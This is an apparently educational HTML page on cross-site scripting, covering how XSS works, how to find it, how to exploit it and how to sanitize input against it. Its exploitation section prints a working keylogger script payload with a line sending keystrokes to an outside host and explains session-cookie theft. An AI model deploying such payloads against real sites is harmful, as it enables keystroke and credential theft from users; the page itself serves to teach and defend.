	<h1> Cross Site Scripting! (XSS) </h1>
		<h2>The Basics</h2>
			<p>
				Cross Site Scripting, more commonly known as XSS, is a type of web vulnerability that allows for the unintended execution of arbitrary javascript on a webpage. It occurs when user input is added to a webpage unsanitized, allowing users to inject html and javascript code, which the browser renders as if it came from the author of the page.
			</p>  

		<h2>Behind the Name</h2>
			<p>
				The name, cross site scripting, refers to the ability to send data to another website, one the hacker controls. XSS is commonly used to steal credentials. The most common use is to send the session cookie to a website the hacker controls. The hacker can then visit the compromised website, replace their session cookie with the stole one, and BOOM, they're logged in as the victim - no password nessecary. 
			</p>

		<h2>Finding XSS Vulns</h2>
			<p>
				To discover XSS vulnerabilities, test any field that accepts user input and attempt to insert special characters, such as script tags. Observe how the input is represented when printed back, and make note of any missing characters or html-encoding. This website details some methods to try to get past basic filtering.

			</p>

		<h2>Exploiting XSS Vulns</h2>
			<p>
				Exploiting XSS vulns simply means getting a script code through any filtering, with some javascript payload enclosed. The simplest example is a plain:
						"&lt;script&gt; alert(1) &lt;/script&gt;"
				The javascript inside the script tag is referred to as the payload. Your payload can be anything you can write in javascript. For example, a keylogger: 
						&lt;script&gt;
						var keys=&#39;&#39;;
						document.onkeypress = function(e) {
						  get = window.event?event:e;
						  key = get.keyCode?get.keyCode:get.charCode;
						  key = String.fromCharCode(key);
						  keys+=key;
						}
						window.setInterval(function(){
						  //new Image().src = &#39;http://hack.com/keylogger?c=&#39;+keys;
						console.log(keys);
						  keys = &#39;&#39;;
						}, 1000);
						&lt;/script&gt;

		<h2>Fortifying Your Code</h2>
			<p>
				To protext your own website from XSS vulnerablilities, sanitize all input from users. If using Jinja with Flask, Jinja will sanitize input for you. There are two main strategies for sanitizing input: black-listing and white-listing. 
					<b>Black Listing</b>
						Create a list of special characters that could be promlematic. This includes script tags, quotes, semicolons, percent signs, ampersands, etc. Either strip these characters out, or html-encode them. This method is more convenient but could be evaded. 
					<b>White Listing</b>
						Filter user input and only accept characters that are nessecary (ie alpha-numeric). This prevents any unintended characters from getting through and is the most secure method. However, this method is less convenient, and not always possible if special characters are needed. In that case, revert to black-listing and html-encode any special characters.
